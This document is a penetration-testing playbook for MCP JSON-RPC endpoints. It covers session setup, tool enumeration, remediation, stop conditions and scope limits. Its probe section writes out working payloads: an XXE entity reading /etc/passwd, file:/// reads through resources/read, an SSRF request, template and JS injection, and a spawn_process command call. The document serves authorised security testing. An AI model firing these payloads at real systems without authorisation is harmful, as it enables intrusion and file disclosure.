# Model Context Protocol (MCP) API Testing — Playbook

## Vulnerability Description

**OWASP:** A01:2021 — Broken Access Control / A04 Insecure Design / A06 Misconfiguration
**CWE:** Mapping varies by flaw — CWE-285 (auth), CWE-502 (deserialization), CWE-94 (code injection),
CWE-611 (XXE), CWE-73/22 (path traversal), CWE-284 (improper access control)

Model Context Protocol (MCP) endpoints expose an application's internal tool/resource
surface to AI agents over JSON-RPC 2.0 (typically HTTP). Each exposed tool may inherit
vulnerabilities from the backend it proxies: raw SQL, arbitrary file read, template
execution, code evaluation, XXE, SSRF, broken access control, command execution, and
sensitive-data disclosure. Because these tools are designed to be *machine-called*, they
are high-value, low-observability attack surfaces and are frequently over-delegated
(admin-only functions exposed without auth).

---

## Types

| Type | Description | Detection signal |
|---|---|---|
| **Sensitive data exposure** | A tool returns config/db creds/api keys/cloud URLs | `get_config`-style tool returns keys |
| **SQL injection** | A tool runs a caller-supplied query expression | arbitrary `select ...` executes |
| **LFI / arbitrary file read** | `resources/read` accepts `file://` URIs | `file:///etc/hosts` returns contents |
| **SSRF / remote relay** | A tool fetches arbitrary `http(s)://` URIs | `http://...` body returned in result |
| **Server-side template injection** | A tool compiles a caller template | `{{=process.version}}` executes |
| **Code / JS injection** | A tool evaluates a caller expression | `process.mainModule...execSync` runs |
| **XXE** | A tool parses caller XML with entities enabled | `<!ENTITY ... SYSTEM "file://...` resolves |
| **Command injection / RCE** | A tool spawns a caller command | `spawn_process`-style tool runs `uname -a` |
| **Broken access control** | A tool should require admin but is public/testable | privileged tool callable unauth'd |
| **Prototype pollution** | A tool merges caller fields into an object | `__proto__` keys adopted |
| **Session/auth misuse** | Predictable or self-sufficient session id | session id doubles as bearer credential |

---

## Detection

### Establish an MCP session (required for non-initialize calls)

MCP over HTTP uses a session model: call `initialize` first, capture the returned
`Mcp-Session-Id` header, then send it with every subsequent request.

```bash
BASE='https://target.com'            # often /api/mcp, /mcp, /sse, or /rpc
# 1) initialize
INIT=$(curl -i -s "${BASE}/api/mcp" -X POST -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"initialize","id":1}')
# capture the session id header (case-insensitive)
MCP_SESSION_ID=$(echo "$INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')

# 2) introspect the exposed surface
curl -s "${BASE}/api/mcp" -X POST -H 'Content-Type: application/json' \
  -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":2}'
curl -s "${BASE}/api/mcp" -X POST -H 'Content-Type: application/json' \
  -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
  -d '{"jsonrpc":"2.0","method":"resources/list","id":3}'
```

### Call a tool (generic shape)

```bash
curl -s "${BASE}/api/mcp" -X POST -H 'Content-Type: application/json' \
  -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"<TOOL>","arguments":{}},"id":4}'
```

### Per-class probes

```bash
# SQL injection into a query-accepting tool
-d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get_count","arguments":{"query":"select count(*) from information_schema.tables"}},"id":5}'

# LFI via resources/read (file://) and SSRF relay via http(s)://
-d '{"jsonrpc":"2.0","method":"resources/read","params":{"uri":"file:///etc/hosts"},"id":6}'
-d '{"jsonrpc":"2.0","method":"resources/read","params":{"uri":"https://test-host.example/"},"id":7}'

# SSTI / JS injection into a template- or expression-evaluating tool
-d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"render","arguments":{"template":"{{=process.version}}"}},"id":8}'

# XXE into a metadata/XML tool
-d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get_metadata","arguments":{"xml":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><r>&e;</r>"}},"id":9}'

# Command injection into a process-spawning tool (admin tools: check auth boundary first)
-d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"spawn_process","arguments":{"command":"uname -a"}},"id":10}'
```

### Access-control boundary checks
- Identify tools the app marks admin-only; call them with an **unauthenticated** session.
- Compare `tools/list` and behavior between guest and authenticated sessions.
- If a session id alone authorizes a call (no token sent each call), test whether a
  truncated/observed/sequential id is accepted — weak session id == self-sufficient credential.

### Streaming (SSE) endpoints
MCP over SSE returns `text/event-stream`; read with `curl -N --no-buffer`. Progress and
partial output events may leak more detail than the final JSON-RPC result.

---

## Tools

| Tool | Purpose | Notes |
|---|---|---|
| **curl** | Manual JSON-RPC calls | `-N --no-buffer` for SSE; `-i` to read headers (session id) |
| **Burp Repeater/Intruder** | Iterate tool names + arguments | via the in-scope HTTP proxy |
| **jq** | Parse JSON-RPC results / SSE payloads | |
| **ffuf** | Fuzz the MCP path + tool names | `ffuf -u '${BASE}/api/mcp' -w toolnames.txt ...` |

---

## Internet Research

- `<product> model context protocol mcp`
- `MCP server security JSON-RPC`
- `MCP tool injection / prompt injection agent`
- `<product> mcp exposed tool vulnerability`
- `CWE mcp server`

---

## Safe Proof of Concept

- Introspect the **surface first** (`tools/list`, `resources/list`), then test read-only
  tools before any write/execute tool.
- Prefer inert probes: `select 1`, `file:///etc/hostname`, a timeout-free command that
  only prints (e.g. `echo MCP_OK`), a template that prints a constant.
- For sensitive-data tools, stop at proving the response shape (e.g. a config key exists)
  rather than dumping secrets.
- Never run a destructive or long-running command through a spawn tool; keep every probe trim.

Proof-of-concept rules:
- Confirm the endpoint is a legitimate MCP/JSON-RPC surface before probing blindly.
- Never use an exposed credential/API key obtained via MCP to access external services.
- Read-only evidence preferred; any write/execute requires separate explicit authorisation.

---

## Evidence

Each finding should include:

```
Vulnerability: MCP — exposed tool allows arbitrary file read (LFI)
URL: https://target.com/api/mcp
Tool: resources/read
Payload: {"uri":"file:///etc/hosts"}

HTTP Request:
  POST /api/mcp HTTP/1.1
  Host: target.com
  Content-Type: application/json
  Mcp-Session-Id: <captured>
  {"jsonrpc":"2.0","method":"resources/read","params":{"uri":"file:///etc/hosts"},"id":5}

Response:
  HTTP/1.1 200 OK
  {"jsonrpc":"2.0","result":{"contents":[{"uri":"file:///etc/hosts","text":"127.0.0.1 localhost ..."}]}}

Proof: the MCP resources/read tool returned the contents of a local system file,
demonstrating an unrestricted file-read proxy reachable through the agent surface.
Remediation: allowlist/validate resource URIs, scope MCP tools to least privilege,
require auth on every call (never treat the session id as a bearer credential),
and gate destructive/admin tools behind per-call authorization.
```

---

## Evidence to Save

- Tool output → `$ENG_DIR/evidence/exploitation/mcp/<finding>.*`
- Raw JSON-RPC request/response pairs → `$ENG_DIR/evidence/exploitation/http/`
- **Always save the raw SSE stream** for streamed tools → `$ENG_DIR/evidence/exploitation/mcp/<finding>.sse`
- Tool/argument inventory from `tools/list` → `$ENG_DIR/evidence/mcp-tools.txt`

---

## Remediation

| Measure | Description |
|---|---|
| **Least-privilege tools** | Expose only the minimum tools; no admin function should be callable by a guest session |
| **Per-call authorization** | Verify identity/authorization on every call, independent of any session id |
| **Strong, random session ids** | Never use predictable/static/sequential session ids; bind sessions to the auth context |
| **Resource URI allowlist** | Validate `file://`, `http(s)://`, and custom URIs against an explicit allowlist |
| **Parameterize queries/commands** | Never evaluate caller-supplied SQL, templates, expressions, or OS commands |
| **Disable external entities** | Parse all XML in tools with XXE protection (see `xxe.md`) |
| **Sanitize tool output** | Redact keys/secrets and reject `__proto__`/`prototype` in tool inputs (see `prototype-pollution.md`) |
| **Audit tool usage** | Log every `tools/call` and stream for detection; rate-limit destructive tools |

---

## Stop Conditions

- A tool returns live production secrets/credentials → record redacted proof, stop active use.
- An exposed tool appears to allow RCE or lateral movement → halt, request separate authorisation.
- Session id enumeration allows reading another client's state → stop, record.

## Blocked Actions

| Action | Risk |
|---|---|
| **Running arbitrary OS commands via a spawn tool** | Remote code execution |
| **Dumping production credentials/API keys from an exposed tool** | Data exfiltration |
| **Using leaked credentials to access external services** | Lateral movement / scope violation |
| **Writing/deleting data through MCP tools** | Data integrity |
| **Enumerating other sessions' state via predictable session ids** | Account compromise |
| **Crafting prompt/tool-injection payloads in output** | Prompt-injection escalation (out of the HTTP-verification scope) |